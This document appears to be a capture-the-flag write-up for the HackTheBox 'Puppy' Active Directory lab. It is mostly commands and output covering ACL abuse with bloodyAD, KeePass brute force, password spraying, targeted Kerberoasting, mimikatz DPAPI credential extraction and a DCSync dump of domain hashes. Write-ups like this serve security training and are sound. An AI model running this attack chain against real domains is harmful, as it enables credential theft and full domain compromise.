## HOST RECON

As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-22 11:06:22Z)
111/tcp  open  rpcbind?
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  mountd        1-3 (RPC #100005)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-22T11:07:18
|_  start_date: N/A
```

#### user enum rid-brute

```
└─$ netexec smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --rid-brute
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               498: PUPPY\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.70     445    DC               500: PUPPY\Administrator (SidTypeUser)
SMB         10.10.11.70     445    DC               501: PUPPY\Guest (SidTypeUser)
SMB         10.10.11.70     445    DC               502: PUPPY\krbtgt (SidTypeUser)
SMB         10.10.11.70     445    DC               512: PUPPY\Domain Admins (SidTypeGroup)
SMB         10.10.11.70     445    DC               513: PUPPY\Domain Users (SidTypeGroup)
SMB         10.10.11.70     445    DC               514: PUPPY\Domain Guests (SidTypeGroup)
SMB         10.10.11.70     445    DC               515: PUPPY\Domain Computers (SidTypeGroup)
SMB         10.10.11.70     445    DC               516: PUPPY\Domain Controllers (SidTypeGroup)
SMB         10.10.11.70     445    DC               517: PUPPY\Cert Publishers (SidTypeAlias)
SMB         10.10.11.70     445    DC               518: PUPPY\Schema Admins (SidTypeGroup)
SMB         10.10.11.70     445    DC               519: PUPPY\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.70     445    DC               520: PUPPY\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.70     445    DC               521: PUPPY\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.70     445    DC               522: PUPPY\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.70     445    DC               525: PUPPY\Protected Users (SidTypeGroup)
SMB         10.10.11.70     445    DC               526: PUPPY\Key Admins (SidTypeGroup)
SMB         10.10.11.70     445    DC               527: PUPPY\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.70     445    DC               553: PUPPY\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.70     445    DC               571: PUPPY\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.70     445    DC               572: PUPPY\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.70     445    DC               1000: PUPPY\DC$ (SidTypeUser)
SMB         10.10.11.70     445    DC               1101: PUPPY\DnsAdmins (SidTypeAlias)
SMB         10.10.11.70     445    DC               1102: PUPPY\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.70     445    DC               1103: PUPPY\levi.james (SidTypeUser)
SMB         10.10.11.70     445    DC               1104: PUPPY\ant.edwards (SidTypeUser)
SMB         10.10.11.70     445    DC               1105: PUPPY\adam.silver (SidTypeUser)
SMB         10.10.11.70     445    DC               1106: PUPPY\jamie.williams (SidTypeUser)
SMB         10.10.11.70     445    DC               1107: PUPPY\steph.cooper (SidTypeUser)
SMB         10.10.11.70     445    DC               1108: PUPPY\HR (SidTypeGroup)
SMB         10.10.11.70     445    DC               1109: PUPPY\SENIOR DEVS (SidTypeGroup)
SMB         10.10.11.70     445    DC               1111: PUPPY\steph.cooper_adm (SidTypeUser)
SMB         10.10.11.70     445    DC               1112: PUPPY\Access-Denied Assistance Users (SidTypeAlias)
SMB         10.10.11.70     445    DC               1113: PUPPY\DEVELOPERS (SidTypeGroup)


#### Users

Àdministrator
Guest
krbtgt
DC$
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm


#### Groups

Enterprise Read-only Domain Controllers
Domain Admins
Domain Users
Domain Guests
Domain Computers
Domain Controllers
Schema Admins
Enterprise Admins
Group Policy Creator Owners
Read-only Domain Controllers
Cloneable Domain Controllers
Protected Users
Key Admins
Enterprise Key Admins
DnsUpdateProxy
HR
SENIOR DEVS
DEVELOPERS
```


#### enum smb shares

```
└─$ netexec smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares

SMB         10.10.11.70     445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
```

## bh data

```
- levi.james ---> memberOf ---> HR
				  |___ members has GenericWrite over DEVELOPERS group

The members of the group HR@PUPPY.HTB have generic write access to the group DEVELOPERS@PUPPY.HTB.
Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user

- ant.edwards ---> memberof ---> DEVELOPERS, SENIOR DEVS
  |___ outbound ---> SENIOR DEVS group has GenericAll over adam.silver
The members of the group SENIOR DEVS@PUPPY.HTB have GenericAll permissions to the user ADAM.SILVER@PUPPY.HTB.

This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.

Targeted Kerberoast, Force Change Password, Shadow Credentials attack

- adam.silver ---> memberof ---> DEVELOPERS, Remote Management Users

- jamie.williams ---> memberof ---> DEVELOPERS

- steph.cooper ---> memberof ---> Remote Management Users

- steph.cooper_adm ---> memberof ---> Administrators
```


#### AddMember

└─$ bloodyAD -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host 10.10.11.70 add groupMember "DEVELOPERS" levi.james
[+] levi.james added to DEVELOPERS


#### After add self to DEVELOPERS group levi.james has access to DEV smb share

```
└─$ netexec smb 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' --shares              
SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.10.11.70     445    DC               [*] Enumerated shares
SMB         10.10.11.70     445    DC               Share           Permissions     Remark
SMB         10.10.11.70     445    DC               -----           -----------     ------

...

SMB         10.10.11.70     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS


└─$ ls -lah recovery.kdbx 
-rw-rw-r-- 1 kalibox kalibox 2.7K May 22 13:27 recovery.kdbx
```

#### crack password of kdbx file

- https://github.com/r3nt0n/keepass4brute

```
└─$ ./keepass4brute.sh ../recovery.kdbx /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt 
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 35/59186 - Attempts per minute: 100 - Estimated time remaining: 9 hours, 51 minutes
[+] Current attempt: liverpool

[*] Password found: liverpool



JAMIE WILLIAMSON - JamieLove2025!
ADAM SILVER - HJKL2025!
ANTONY C. EDWARDS - Antman2025!
STEVE TUCKER - Steve2025!
SAMUEL BLAKE - ILY2025!
```


#### pass spray

```
└─$ netexec smb 10.10.11.70 -u users.txt -p pass.txt --continue-on-success

SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
```


#### Try Targeted Kerberoast, Force Change Password, Shadow Credentials attacks

- Targeted Kerberoast, not crackeble hash

```
└─$ faketime -f +7hr ./targetedKerberoast.py -v -d puppy.htb -u ant.edwards -p 'Antman2025!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (adam.silver)
[+] Printing hash for (adam.silver)
$krb5tgs$23$*adam.silver$PUPPY.HTB$puppy.htb/adam.silver*$e1c954f865781ccbdfae157064e9a64a$9be78ee859ed525707e4a1bb4dc56f3f357ca49c931a99a418daa5c44efe0174523391275bd8333be1f293f73cede046f31acd2b7f034b8c848013cbe9c6db7506571ba00e975d25f678a4ed4fb159d3fcd92aca92aa056fc7d43d7616e0f6a240095e61181740eb7fe7417b387c5c7062ba209dbdbb280b84544f19c39a3a798a4e9b1f1cfb44a370c00ffcce08f9ec53d848a9ffc1f16032d170c165c32a5832defc08291cf9e262ec9254fc02d93962ec77043601ffe548f5c0f9978ce652d205a37558cfe0e4f16735cea951172d86928737231faff5de447656bba9bb43b9bf48702dd340cb3c468c18c1bb767b2f59fc4fdad9116fe2c5a431e50b21aa9dd1279551acf0c0e7eddd329a2e74f49a6705084e503217e0ac51ee8517e23f75fc17f72571a877e5c41f131bba3c61c1e0659841fee723a142e0d54aaab53c76319df010b4b4ad746ce8ace8cb8ba46cf4aad935f711cfadcc45858752d77f914bfb4c3d4f59dde6ed0522d2e5625796668b1433b84a704f9535b2c9128765bbbba0ed2c34083d19359d2c377c0eb54116a2c91f49acfe83dbe7f919961d5a7b03abe95d4e1fdbf5181661523acdf7547bc4106fa2edaf7f939aa8f86a11b4bea0d88d3a70c36d12a1f8a420637c45c0f2d1c535f26521e3b4fcda99a564d256b01f0253eb65939a5892d5742967eb9f86bf06d3778bff62e83746a2bd63bc4074754d347035b6640e22e9a381a05c97a2842415cb63a1638396975dbae6046077695f6fefeffcc583a4bd59fb4aff91d3aaa14feaadab8faa62b5498b9e59fd71d9f806713e19bed797cbcd818d2321e92296f327120cd50f06214044316ab06595432aa4740350469d372d1a61184c8058eec412680665af7055ea20af2d082a75990024ce11e318bc52dc1a2bf3ebc05b72a10602000f62210ad11f9716d8b2c4c79990e2dfb8ca9a312706f5e94a0c4f78d9bb1b7e1550574b2b6c17a0c2aee7fbc809ea1a43946c4c63f03d8ea747232bd567317425838a3a50048d46a9382178af2548b94f9339e6f9cd2243a5456e02d9e769d1960a23032d0847c1348d2f1bb3be422f8b8ec058b56eff8a7d86f3a4d27ff8653205e0222f6009b82df9f0c026dd29d10cc86b352294185ee7cc027955da2381f7a54b91469f0fbb669a7207956784039dd74e44a1042d2056e294a4f7b2a73e69bce711c0d934aa5b806d300c1e1286b6e5d2850cae2ec8f82df5dcfc8cc2306b9c8923a0027260b4e8d99b9f37787e0cc26f60b6ea32602976dc2c4a0c75f498d9c75c0d8aa283276941d6d4b09d6e9674182d0495e71ffa28c4c80c2c4779fb3254a352ce1c8b9684f99699367521e5d622ec64fde552eb41510982ab0103a2ae1d092c2beaa7c52fb4cc28efa466f6406aa8ba2552cfff8ca022300993186b7cade11faea6a4024a50a4894fc7786d099ce316183c6910d849730bc163c762134b9e61b0680f1c0d0e97e2f9eff037ee8cb8f97b10ee1d15f8e2634c77d0665570396b6b970c732f60fe434ce6a292a117a9021b60e690908574dd17e2c83efd4362083b1f2b1878caa36d44c0411610254c9bc80dcf93a8bf265f
[VERBOSE] SPN removed successfully for (adam.silver)
```

- Force Change Password works but adam.silver account is disabled

```
└─$ bloodyAD -d puppy -u ant.edwards -p 'Antman2025!' --host 10.10.11.70 set password adam.silver Pass123
[+] Password changed successfully!
```

```
└─$ netexec smb 10.10.11.70 -u adam.silver -p Pass123 

SMB         10.10.11.70     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         10.10.11.70     445    DC               [-] PUPPY.HTB\adam.silver:Pass123 STATUS_ACCOUNT_DISABLED 
```

- enabling adam.silver account

```
└─$ bloodyAD -d puppy -u ant.edwards -p 'Antman2025!' --host 10.10.11.70 remove uac -f ACCOUNTDISABLE adam.silver
[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```


#### adam.silver loggin via winrm

```
└─$ evil-winrm -i 10.10.11.70 -u adam.silver -p Pass123  

*Evil-WinRM* PS C:\Users\adam.silver\Documents> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
puppy\adam.silver S-1-5-21-1487982659-1829050783-2281216199-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
PUPPY\DEVELOPERS                            Group            S-1-5-21-1487982659-1829050783-2281216199-1113 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

```
└─$ cat puppy/nms-auth-config.xml.bak                   
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password></bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

#### steph.cooper loggin via winrm

```
└─$ evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!'

*Evil-WinRM* PS C:\Users\steph.cooper\Documents> whoami /all

USER INFORMATION
----------------

User Name          SID
================== ==============================================
puppy\steph.cooper S-1-5-21-1487982659-1829050783-2281216199-1107


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

- SeatBelt report

```
====== ChromiumHistory ======

History (C:\Users\steph.cooper\AppData\Local\Microsoft\Edge\User Data\Default\History):


====== ChromiumPresence ======


  C:\Users\steph.cooper\AppData\Local\Microsoft\Edge\User Data\Default\

    'History'     (3/8/2025 7:40:44 AM)  :  Run the 'ChromiumHistory' command


====== DpapiMasterKeys ======

  Folder : C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107

    LastAccessed              LastModified              FileName
    ------------              ------------              --------
    3/8/2025 7:40:36 AM       3/8/2025 7:40:36 AM       556a2412-1275-4ccf-b721-e6a0b4f90407
```

- extract master-key
- https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html#master-key-extraction-options

```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> .\mimikatz.exe "dpapi::masterkey /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" exit

...

[domainkey] with RPC
[DC] 'PUPPY.HTB' will be the domain
[DC] 'DC.PUPPY.HTB' will be the DC server
  key : d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

- extract encrypted blob with masterkey
- https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html#access-dpapi-encrypted-data

```
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> .\mimikatz.exe "dpapi::cred /in:C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84" exit


  TargetName     : Domain:target=PUPPY.HTB
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : steph.cooper_adm
  CredentialBlob : FivethChipOnItsWay2025!
  Attributes     : 0
```

## steph.cooper_adm creds

```
└─$ netexec smb 10.10.11.70 -u users.txt -p 'FivethChipOnItsWay2025!' --continue-on-success           
...

SMB         10.10.11.70     445    DC               [+] PUPPY.HTB\steph.cooper_adm:FivethChipOnItsWay2025! 
```

#### DCSync 

```
└─$ impacket-secretsdump puppy.htb/steph.cooper_adm:'FivethChipOnItsWay2025!'@10.10.11.70
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
[*] NL$KM 
 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+'V.\k....
NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb0edc15e49ceb4120c7bd7e6e65d75b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
Administrator:des-cbc-md5:20b9e03d6720150d
krbtgt:aes256-cts-hmac-sha1-96:f2443b54aed754917fd1ec5717483d3423849b252599e59b95dfdcc92c40fa45
krbtgt:aes128-cts-hmac-sha1-96:60aab26300cc6610a05389181e034851
krbtgt:des-cbc-md5:5876d051f78faeba
PUPPY.HTB\levi.james:aes256-cts-hmac-sha1-96:2aad43325912bdca0c831d3878f399959f7101bcbc411ce204c37d585a6417ec
PUPPY.HTB\levi.james:aes128-cts-hmac-sha1-96:661e02379737be19b5dfbe50d91c4d2f
PUPPY.HTB\levi.james:des-cbc-md5:efa8c2feb5cb6da8
PUPPY.HTB\ant.edwards:aes256-cts-hmac-sha1-96:107f81d00866d69d0ce9fd16925616f6e5389984190191e9cac127e19f9b70fc
PUPPY.HTB\ant.edwards:aes128-cts-hmac-sha1-96:a13be6182dc211e18e4c3d658a872182
PUPPY.HTB\ant.edwards:des-cbc-md5:835826ef57bafbc8
PUPPY.HTB\adam.silver:aes256-cts-hmac-sha1-96:91e8060c7185a8cccbe923bba1ef6ba3849204f2a106ebd3620553999a8df4cc
PUPPY.HTB\adam.silver:aes128-cts-hmac-sha1-96:52177504ca3713c771a6b7da0d88de21
PUPPY.HTB\adam.silver:des-cbc-md5:83b0ecd998574a02
PUPPY.HTB\jamie.williams:aes256-cts-hmac-sha1-96:aeddbae75942e03ac9bfe92a05350718b251924e33c3f59fdc183e5a175f5fb2
PUPPY.HTB\jamie.williams:aes128-cts-hmac-sha1-96:d9ac02e25df9500db67a629c3e5070a4
PUPPY.HTB\jamie.williams:des-cbc-md5:cb5840dc1667b615
PUPPY.HTB\steph.cooper:aes256-cts-hmac-sha1-96:799a0ea110f0ecda2569f6237cabd54e06a748c493568f4940f4c1790a11a6aa
PUPPY.HTB\steph.cooper:aes128-cts-hmac-sha1-96:cdd9ceb5fcd1696ba523306f41a7b93e
PUPPY.HTB\steph.cooper:des-cbc-md5:d35dfda40d38529b
PUPPY.HTB\steph.cooper_adm:aes256-cts-hmac-sha1-96:a3b657486c089233675e53e7e498c213dc5872d79468fff14f9481eccfc05ad9
PUPPY.HTB\steph.cooper_adm:aes128-cts-hmac-sha1-96:c23de8b49b6de2fc5496361e4048cf62
PUPPY.HTB\steph.cooper_adm:des-cbc-md5:6231015d381ab691
DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
DC$:des-cbc-md5:7f044607a8dc9710
```